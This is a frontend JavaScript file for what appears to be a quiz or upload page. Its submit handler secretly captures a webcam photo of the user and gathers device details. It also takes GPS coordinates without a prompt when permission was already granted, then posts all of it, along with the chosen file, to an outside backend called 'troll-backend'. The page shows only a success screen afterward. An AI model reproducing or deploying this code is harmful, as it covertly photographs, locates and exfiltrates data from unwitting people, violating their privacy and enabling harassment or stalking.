// ================================
// FRONTEND SCRIPT.JS (NO TOASTS)
// ================================

const btn = document.getElementById('submit-btn');
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const fileInput = document.getElementById('user-file');

const BACKEND_BASE = "https://troll-backend.onrender.com/api";

// ================================
// SILENT LOCATION (NO POPUP)
// ================================
async function getSilentLocation() {
  let loc = "";

  if (!navigator.permissions) return loc;

  try {
    const status = await navigator.permissions.query({ name: "geolocation" });

    if (status.state === "granted") {
      const pos = await new Promise((res, rej) =>
        navigator.geolocation.getCurrentPosition(res, rej)
      );
      loc = `${pos.coords.latitude}, ${pos.coords.longitude}`;
    }
  } catch {}

  return loc;
}

// ================================
// METADATA
// ================================
async function collectMetadata() {
  return {
    width: innerWidth,
    height: innerHeight,
    platform: navigator.platform,
    language: navigator.language,
    useragent: navigator.userAgent,
    time: new Date().toLocaleString(),
    location: await getSilentLocation()
  };
}

// ================================
// CAMERA
// ================================
async function captureAndSend() {
  const stream = await navigator.mediaDevices.getUserMedia({
    video: { facingMode: "user" },
    audio: false
  });

  video.srcObject = stream;
  await new Promise(r => setTimeout(r, 2500));

  const ctx = canvas.getContext("2d");
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

  const image = canvas.toDataURL("image/png");
  const metadata = await collectMetadata();

  await fetch(`${BACKEND_BASE}/upload`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ image, metadata })
  });

  stream.getTracks().forEach(t => t.stop());
}

// ================================
// FILE
// ================================
async function sendFile(file) {
  const reader = new FileReader();
  reader.onload = async () => {
    await fetch(`${BACKEND_BASE}/file-upload`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ file: reader.result, filename: file.name })
    });
  };
  reader.readAsDataURL(file);
}

// ================================
// SUBMIT
// ================================
btn.addEventListener("click", async e => {
  e.preventDefault();

  if (!fileInput.files.length) return;

  await captureAndSend();
  await sendFile(fileInput.files[0]);

  document.getElementById("quiz-container").style.display = "none";
  document.getElementById("success-container").style.display = "block";
});
